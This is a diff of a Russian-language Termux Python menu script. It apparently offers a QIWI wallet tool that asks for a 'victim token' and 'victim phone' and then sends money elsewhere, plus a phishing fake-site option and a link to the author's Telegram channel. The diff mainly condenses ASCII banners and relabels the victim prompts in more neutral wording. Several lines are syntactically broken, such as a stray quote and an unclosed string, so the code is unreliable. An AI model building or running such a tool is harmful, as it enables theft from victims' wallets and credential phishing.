@@ -5,33 +5,29 @@ from colorama import Fore, Back, Style
 
 def cls():
     os.system('cls' if os.name=='nt' else 'clear')
+banner = """
+
+░██████╗░░██████╗░██╗░██╗░░░░░░░██╗██╗
+██╔════╝░██╔═══██╗██║░██║░░██╗░░██║██║
+██║░░██╗░██║██╗██║██║░╚██╗████╗██╔╝██║
+██║░░╚██╗╚██████╔╝██║░░████╔═████║░██║
+╚██████╔╝░╚═██╔═╝░██║░░╚██╔╝░╚██╔╝░██║
+░╚═════╝░░░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝
+"""
 
 cls()
-print(Fore.GREEN + " /\  __\    /\__  _\    /\ \  __/\ \   /\__  _\   ")
-print(" \ \ \/\ \   \/_/\ \/    \ \ \/\ \ \ \  \/_/\ \/    ")
-print("  \ \ \ \ \     \ \ \     \ \ \ \ \ \ \    \ \ \   ")
-print("   \ \ \ \ \     \_\ \__   \ \ \_/ \_\ \    \_\ \__  ")
-print("    \ \___\_\    /\_____\   \ \___x___/    /\_____\  ")
-print("     \/__//_/    \/_____/    '\/__//__/     \/_____/ ")
-print("")
-print(" /\___ \                      /\ \                   ")    
-print(" \/__/\ \      __       ___   \ \ \/'\       __    _ __   ")
-print("    _\ \ \  /'__`\    /'___\   \ \ , <     /'__`\ /\`'__\  ")
-print("   /\ \_\ \/\ \L\.\_ /\ \__/    \ \ \\`\  /\  __/ \ \ \/  ")
-print("   \ \____/\ \__/.\_\\ \____\     \ \_\ \_\\ \____\ \ \_\  ")
-print("    \/___/  \/__/\/_/ \/____/     \/_/\/_/ \/____/  \/_/   ")
+print(Fore.GREEN + banner ")
                                       
 print(" ")
-print(Fore.CYAN + "  by @TermuxGulde (нет) (telegram)")
-print("-------------------------------------------------")
 print(Fore.BLACK + " ")
 print(" ")
-print(Fore.YELLOW + " [1] QIWI API (web version) | веб версия")
+print(Fore.YELLOW + " [1] QIWI API | веб версия")
 print(" ")
                    
-print(Fore.MAGENTA + " [2] QIWI API (terminal) | в терминале")
+print(Fore.MAGENTA + " [2] QIWI API | в терминале")
 print(" ")
 print(Fore.BLUE + " [3] Fishing fake site | фишинг ")
+print(Fore.Cyan + " [4] Подписаться на автора
 print(" ")
 print(" ")
 
@@ -40,22 +36,7 @@ a = input(Fore.GREEN + " Change parametr | Выберите параметр: ")
 
 if a == "1":
     cls()
-    print(Fore.GREEN + " /\  __\    /\__  _\    /\ \  __/\ \   /\__  _\   ")
-    print(" \ \ \/\ \   \/_/\ \/    \ \ \/\ \ \ \  \/_/\ \/    ")
-    print("  \ \ \ \ \     \ \ \     \ \ \ \ \ \ \    \ \ \   ")
-    print("   \ \ \ \ \     \_\ \__   \ \ \_/ \_\ \    \_\ \__  ")
-    print("    \ \___\_\    /\_____\   \ \___x___/    /\_____\  ")
-    print("     \/__//_/    \/_____/    '\/__//__/     \/_____/ ")
-    print("")
-    print("  _                                               ")
-    print(" /\___ \                     /\ \                   ")    
-    print(" \/__/\ \     __       ___   \ \ \/'\       __    _ __   ")
-    print("    _\ \ \  /'__`\    /'___\  \ \ , <     /'__`\ /\`'__\  ")
-    print("   /\ \_\ \/\ \L\.\_ /\ \__/   \ \ \\`\  /\  __/ \ \ \/  ")
-    print("   \ \____/\ \__/.\_\\ \____\    \ \_\ \_\\ \____\ \ \_\  ")
-    print("    \/___/  \/__/\/_/ \/____/    \/_/\/_/ \/____/  \/_/   ")
-    print(" ")
-    print(Fore.CYAN + "  by @TermuxGulde (нет) (telegram)")
+    print(Fore.GREEN + banner)
     print("-------------------------------------------------")
                                           
     print(" ")
@@ -70,57 +51,27 @@ if a == "1":
         print(Fore.WHITE + "apt install php")
 
 elif a == "2":
-    print(Fore.GREEN + " /\  __\    /\__  _\    /\ \  __/\ \   /\__  _\   ")
-    print(" \ \ \/\ \   \/_/\ \/    \ \ \/\ \ \ \  \/_/\ \/    ")
-    print("  \ \ \ \ \     \ \ \     \ \ \ \ \ \ \    \ \ \   ")
-    print("   \ \ \ \ \     \_\ \__   \ \ \_/ \_\ \    \_\ \__  ")
-    print("    \ \___\_\    /\_____\   \ \___x___/    /\_____\  ")
-    print("     \/__//_/    \/_____/    '\/__//__/     \/_____/ ")
-    print("")
-    print(" /\___ \                     /\ \                   ")    
-    print(" \/__/\ \     __       ___   \ \ \/'\       __    _ __   ")
-    print("    _\ \ \  /'__`\    /'___\  \ \ , <     /'__`\ /\`'__\  ")
-    print("   /\ \_\ \/\ \L\.\_ /\ \__/   \ \ \\`\  /\  __/ \ \ \/  ")
-    print("   \ \____/\ \__/.\_\\ \____\    \ \_\ \_\\ \____\ \ \_\  ")
-    print("    \/___/  \/__/\/_/ \/____/    \/_/\/_/ \/____/  \/_/   ")
-    print(" ")
-    print(Fore.CYAN + "  by @TermuxGulde (нет) (telegram)")
+    print(Fore.GREEN + banner)
     print("-------------------------------------------------")
     print(" ")
              
-    token = input(Fore.YELLOW + ' Enter victim token: ')
+    token = input(Fore.YELLOW + ' Токен: ')
     print(" ")
-    phone = input(' Enter victim phone: ')
+    phone = input(' Номер телефона: ')
     print(" ")
-    summa = input(" Money | Сумма: ")
+    summa = input(" Сумма: ")
     print(" ")
-    com = input(" Comments on the translation | Комментарий к переводу: ")
+    com = input(" Комментарий к переводу: ")
     api = QApi(token=token, phone=phone)
     print(" ")
-    print(Fore.WHITE + 'Balance Founded | Найдено!')
+    print(Fore.WHITE + 'Найдено!')
             
-    api.pay(account=" Where to transfer money? | Куда перевести деньги: ", amount= a, comment=com)
+    api.pay(account=" Куда перевести деньги: ", amount= a, comment=com)
     print(api.balance)
 
 elif a == "3":
     cls()
-    print(Fore.GREEN + " /\  __\    /\__  _\    /\ \  __/\ \   /\__  _\   ")
-    print(" \ \ \/\ \   \/_/\ \/    \ \ \/\ \ \ \  \/_/\ \/    ")
-    print("  \ \ \ \ \     \ \ \     \ \ \ \ \ \ \    \ \ \   ")
-    print("   \ \ \ \ \     \_\ \__   \ \ \_/ \_\ \    \_\ \__  ")
-    print("    \ \___\_\    /\_____\   \ \___x___/    /\_____\  ")
-    print("     \/__//_/    \/_____/    '\/__//__/     \/_____/ ")
-    print("")
-    print("  _                                               ")
-    print(" /\___ \                     /\ \                   ")    
-    print(" \/__/\ \     __       ___   \ \ \/'\       __    _ __   ")
-    print("    _\ \ \  /'__`\    /'___\  \ \ , <     /'__`\ /\`'__\  ")
-    print("   /\ \_\ \/\ \L\.\_ /\ \__/   \ \ \\`\  /\  __/ \ \ \/  ")
-    print("   \ \____/\ \__/.\_\\ \____\    \ \_\ \_\\ \____\ \ \_\  ")
-    print("    \/___/  \/__/\/_/ \/____/    \/_/\/_/ \/____/  \/_/   ")
-    print(" ")
-    print(Fore.CYAN + "  by @TermuxGulde (нет) (telegram)")
-    print("-------------------------------------------------")
+    print(Fore.GREEN + banner)
     print(" ")
                                            
     print(" ")
@@ -138,8 +89,11 @@ elif a == "3":
     except:
         print(Fore.RED + "Download php, or reboot your device | Установите php или перезагрузите устройство")
         print(Fore.WHITE + "apt install php")
+elif a == "4":
+      os.system("termux-open-url 'https://t.me/TerPackZ'")
+      exit()
 else:
-	print(Fore.RED + " Выбран неверный параметр | No found such parametr")
+	print(Fore.RED + " Выбран неверный параметр ")
 	
 
         
